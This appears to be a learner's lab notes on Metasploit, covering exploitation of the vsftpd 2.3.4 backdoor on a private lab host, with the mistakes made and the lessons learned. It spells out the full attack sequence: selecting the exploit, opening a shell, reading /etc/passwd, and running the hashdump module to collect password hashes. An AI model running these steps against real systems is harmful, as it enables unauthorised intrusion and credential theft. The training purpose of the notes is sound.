### Commands Run

```bash
# Start Metasploit console
msfconsole

# Get help
help

# Search for a specific vulnerability
search vsftpd
search type:exploit platform:linux

# Get info about a module before using it
info exploit/unix/ftp/vsftpd_234_backdoor

# Use the module
use exploit/unix/ftp/vsftpd_234_backdoor

# Show required/optional options
show options

# Set target
set RHOSTS 192.168.56.101

# Show available payloads
show payloads

# Set payload (bind shell — connects back on a port)
set PAYLOAD cmd/unix/interact

# Run the exploit
run
# or: exploit

# Post-exploitation: who are we?
whoami
id
uname -a
cat /etc/passwd

# Background the session
background

# List active sessions
sessions -l

# Re-enter a session
sessions -i 1

# Upgrade to meterpreter (if applicable)
sessions -u 1

# Search for modules — auxiliary, post, etc.
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.56.101
run

# Use post-exploitation module after getting session
use post/linux/gather/hashdump
set SESSION 1
```

The backdoor in vsftpd 2.3.4 is triggered by sending a username containing a smiley face (`:)`) — this opens a bind shell on port 6200. Metasploit automates this completely.

**The vulnerability:** vsftpd 2.3.4 was compromised in the official download — someone inserted a backdoor into the source code. The backdoor opens port 6200 and gives a root shell when triggered.

### Mistakes Made

1. **Typed `exploit` instead of `use` when selecting a module** — `exploit` runs the current module, `use` selects one. Easy mistake early on.
2. **Tried to run the exploit without setting RHOSTS** — got "RHOSTS is not set" error. Always run `show options` first to see what's required.
3. **Lost a session by accidentally typing `exit`** — exited the shell instead of backgrounding it. Use `background` or `Ctrl+Z` to background a session, not `exit`.
4. **Confused the msfconsole prompt levels** — `msf6 >` is the base, `msf6 exploit(...) >` is inside a module. `back` goes up a level.

### What I Learned

- **Metasploit module categories**: `auxiliary` (scanning/recon), `exploit` (active exploitation), `post` (post-exploitation), `payload` (code run on target), `encoder` (obfuscation), `nop` (nop sleds).
- **RHOSTS vs RHOST**: most modules use `RHOSTS` which accepts ranges (192.168.1.0/24), single IPs, or files. Older modules use `RHOST` (single IP).
- **Sessions** are how Metasploit manages active connections. `sessions -l` lists them, `sessions -i <id>` interacts with one.
- **The vsftpd 2.3.4 backdoor** is a supply-chain attack from 2011 — someone compromised the official download. A reminder that software provenance matters.
- **`show payloads`** after selecting an exploit shows only compatible payloads — important because not all payloads work with all exploits.
